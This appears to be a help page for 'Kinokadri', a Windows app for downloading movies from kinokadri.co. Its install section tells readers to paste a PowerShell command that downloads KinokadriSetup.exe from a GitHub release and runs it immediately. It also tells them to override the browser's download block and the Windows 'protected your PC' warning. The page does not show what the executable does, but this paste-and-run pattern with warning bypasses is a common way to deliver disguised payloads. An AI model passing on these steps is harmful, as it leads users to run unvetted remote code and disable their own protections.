How to download a movie

Install the app once. After that, any movie takes three actions to download.

  1. 1Download and install the app
  2. 2Copy the movie link from the site
  3. 3Paste the link into the app
  4. 4Choose the quality and download
1

Download and install the app

The app is hosted on GitHub. Choose one of two ways — the result is the same.

Way 1. Install with one command (PowerShell)

The easiest way: Windows downloads the app from GitHub and installs it by itself.

  1. Right-click the Windows sign at the bottom of the screen and choose Terminal (on Windows 10 it is called Windows PowerShell).
    SystemDevice Manager2TerminalTerminal (Admin)Task ManagerSettings
    1

    1 right-click the Windows sign  →  2 Terminal

  2. Copy this command with the “Copy” button. 
    curl.exe -L -o "$env:TEMP\KinokadriSetup.exe" "https://github.com/repackfile/kinokadri-app/releases/latest/download/KinokadriSetup.exe"; if ($?) { Start-Process "$env:TEMP\KinokadriSetup.exe" }
  3. In the window that opened, press the right mouse button (the command is pasted), then the Enter key. The app is downloaded and the installation starts by itself.
    Windows PowerShell—  ☐  ✕
    PS C:\Users\You> curl.exe -L -o … KinokadriSetup.exe …

    right mouse button, then Enter

The command does two things: it downloads KinokadriSetup.exe from GitHub to the temporary folder and runs it. Administrator rights are not needed.

Way 2. Download from GitHub

  1. Click the “Download” button. The app page on GitHub opens.
  2. In the lower part of that page find the Assets section and click the file KinokadriSetup.exe. You do not need the “Source code” files.
  3. If the browser stops the download and says the file is not commonly downloaded, open the browser's downloads list and choose Keep.
  4. Open the downloaded file with a double click. The app installs and opens by itself.

The app is new, so Windows may show a blue window saying “Windows protected your PC”. If it does, click More info, then Run anyway. Make sure you downloaded the file from this GitHub page and not from another site.

On some computers the installer shows “Installing Microsoft WebView2”. This is a Microsoft component; it is installed once and takes a few minutes. Do not close the window.

2

Read the terms and agree

On first launch the app shows what it does on your computer. Read it, tick “I have read and agree to the terms” and click “Agree and continue”.

This screen is shown only once.

3

Copy the movie link from the site

  1. Open kinokadri.co and go to the page of the movie you want to download.
  2. Click the bar at the top of the browser where the site address is shown. The address becomes selected (blue).
  3. Press Ctrl + C on the keyboard. The link is copied.
https://kinokadri.co/movie/project-wolf-hunting/
↑ This is the movie link. Select it and press Ctrl + C

The link always starts like this: kinokadri.co/movie/…

4

Paste the link into the app

  1. Go back to the Kinokadri app, to the “Downloads” page.
  2. Click the “Paste” button. The link appears in the field and the movie opens.

If you prefer: click the field, press Ctrl + V, then click “Open”.

5

Choose the quality and audio

  1. Quality: the higher the number, the better the picture and the larger the file. The approximate size is shown next to it.
  2. Audio: choose a language. You can select several and switch between them in your player.
  3. Click “Download”.

1080P and 4K files are smaller than you might expect because they are made with modern encoding. The quality is not reduced. Click the yellow “!” sign for details.

6

Wait and watch

The movie appears in the list with a progress bar. You can close the app: it stays as a small icon next to the clock and keeps downloading.

  • When it says “Done”, click the ▷ sign and the movie opens.
  • The folder sign shows where the file is (usually Videos → Kinokadri).
  • All downloaded movies are listed on the “Library” page.

For the next movie repeat steps 3–5. You do not need to install the app again.

Frequently asked questions

Is the app paid?

No, the app and movie downloads are free.

I pasted a link and the app says the movie was not found

The link must be the address of a movie page and start like this: kinokadri.co/movie/… A link to the home page, search or a series will not work. Open the movie page itself and copy the address from there.

The downloaded movie does not open or has no sound

On some computers the standard Windows player cannot open 1080P and 4K files. Install the free VLC player (videolan.org) and open the movie with it. Or download the 720P quality, which opens everywhere.

Can I pause a download and continue later?

Yes. Click the pause sign in the list, and the ▷ sign to continue. The download resumes from where it stopped, even after the computer was turned off.

How do I remove the app?

Open “Apps” in Windows Settings, find Kinokadri and click “Uninstall”. Downloaded movies are not deleted.

Does it work on a phone or a Mac?

For now the app works only on Windows 10 and 11.
